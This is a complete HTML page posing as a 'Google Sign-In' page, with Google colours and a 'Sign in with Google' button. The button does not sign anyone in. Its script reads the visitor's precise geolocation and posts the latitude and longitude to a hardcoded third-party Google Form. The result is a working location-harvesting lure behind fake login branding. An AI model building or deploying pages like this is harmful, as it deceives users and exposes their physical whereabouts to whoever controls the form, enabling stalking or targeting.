<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Sign-In with Location</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
      padding: 20px;
      background-color: #f4f4f9;
      color: #333;
      text-align: center;
    }
    h1 {
      background: linear-gradient(to right, #DB4437, #F4B400, #0F9D58);
      -webkit-background-clip: text;
      color: transparent;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      color: white;
      background-color: #007BFF;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    button:hover {
      background-color: #0056b3;
    }
    p {
      font-size: 18px;
      color: #F4B400;
    }
    .green-text {
      color: #34A853;
    }
  </style>
</head>
<body>

  <h1>Google Sign-In</h1>
  <p>Click the button below to sign in and send your location to Google Forms:</p>
  <button onclick="getLocation()">Sign in with Google</button>
  <p id="output"></p>

  <script>
    function sendLocationToGoogleForm(latitude, longitude) {
      const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdxTw7tsM-Ywv2BWDQ5QtOpOoqeLC_9vAogr7RDDCr4OnAR-w/formResponse";
      const formData = new FormData();
      
      formData.append("entry.1622877945", latitude);  // Latitude
      formData.append("entry.603826075", longitude); // Longitude

      fetch(formURL, {
        method: "POST",
        mode: "no-cors",
        body: formData
      }).then(() => {
        document.getElementById("output").innerHTML = `<span class="green-text">‚úÖ Location sent successfully!</span>`;
      }).catch(error => {
        console.error("Error:", error);
        document.getElementById("output").textContent = "‚ùå Error sending location.";
      });
    }

    function getLocation() {
      const output = document.getElementById("output");

      if (navigator.geolocation) {
        output.textContent = "üîÑ Getting your location...";
        navigator.geolocation.getCurrentPosition(position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          output.innerHTML = `üåç Your Location: <b>Latitude ${latitude}, Longitude ${longitude}</b><br>Sending to Google Form...`;

          sendLocationToGoogleForm(latitude, longitude);
        }, error => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              output.textContent = "‚ùå Permission denied. Please allow location access.";
              break;
            case error.POSITION_UNAVAILABLE:
              output.textContent = "‚ùå Location information is unavailable.";
              break;
            case error.TIMEOUT:
              output.textContent = "‚ùå The request to get your location timed out.";
              break;
            default:
              output.textContent = "‚ùå An unknown error occurred.";
          }
        });
      } else {
        output.textContent = "‚ùå Geolocation is not supported by your browser.";
      }
    }
  </script>

</body>
</html>
